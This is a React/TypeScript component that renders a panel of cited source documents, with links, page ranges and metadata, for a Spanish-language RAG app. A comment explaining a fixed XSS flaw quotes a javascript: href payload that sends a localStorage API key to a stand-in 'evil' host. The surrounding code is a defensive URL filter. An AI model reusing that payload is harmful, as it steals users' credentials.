import type { SourceRef } from "../types";

/**
 * React NO bloquea esquemas peligrosos en `href`: solo avisa por consola y
 * renderiza igual. `source_url` viene del frontmatter que escribe el pipeline
 * OCR a partir del enlace del portal, así que un valor manipulado como
 * `javascript:fetch('https://evil/'+localStorage.getItem('sein-rag-api-key'))`
 * se convertía en un enlace "PDF original" que exfiltraba la API key al
 * primer click. Solo se aceptan http(s).
 */
function safeHref(url: string | null): string | null {
  if (!url) return null;
  try {
    const parsed = new URL(url, window.location.origin);
    return parsed.protocol === "https:" || parsed.protocol === "http:" ? parsed.href : null;
  } catch {
    return null;
  }
}

interface Props {
  sources: SourceRef[];
  highlighted: number | null;
  onClose: () => void;
}

export function SourcesPanel({ sources, highlighted, onClose }: Props) {
  if (sources.length === 0) return null;
  return (
    <aside className="sources-panel">
      <div className="sources-header">
        <h2>Fuentes</h2>
        <button className="icon-btn" onClick={onClose} aria-label="Cerrar panel">
          ✕
        </button>
      </div>
      <div className="sources-list">
        {sources.map((s) => (
          <div
            key={s.n}
            id={`source-${s.n}`}
            className={`source-card${highlighted === s.n ? " highlighted" : ""}`}
          >
            <div className="source-title">
              <span className="source-n">[{s.n}]</span>{" "}
              {safeHref(s.source_url) ? (
                <a
                  href={safeHref(s.source_url)!}
                  target="_blank"
                  rel="noreferrer noopener"
                  className="source-title-link"
                  title="Ver el documento en el portal de Osinergmin"
                >
                  {s.source_file}
                </a>
              ) : (
                s.source_file
              )}
              {s.page_start != null && (
                <span className="source-page">
                  {" "}
                  pág. {s.page_start}
                  {s.page_end != null && s.page_end !== s.page_start ? `–${s.page_end}` : ""}
                </span>
              )}
            </div>
            <dl className="source-meta">
              {s.usuario_libre && (
                <>
                  <dt>Usuario libre</dt>
                  <dd>{s.usuario_libre}</dd>
                </>
              )}
              {s.suministrador && (
                <>
                  <dt>Suministrador</dt>
                  <dd>{s.suministrador}</dd>
                </>
              )}
              {s.tipo && (
                <>
                  <dt>Tipo</dt>
                  <dd>{s.tipo}</dd>
                </>
              )}
              {s.fecha_suscripcion && (
                <>
                  <dt>Suscripción</dt>
                  <dd>{s.fecha_suscripcion}</dd>
                </>
              )}
            </dl>
            {s.section && <div className="source-section">§ {s.section}</div>}
            <p className="source-snippet">{s.snippet}…</p>
            {safeHref(s.source_url) && (
              <a
                href={safeHref(s.source_url)!}
                target="_blank"
                rel="noreferrer noopener"
                className="source-link"
              >
                PDF original ↗
              </a>
            )}
          </div>
        ))}
      </div>
    </aside>
  );
}
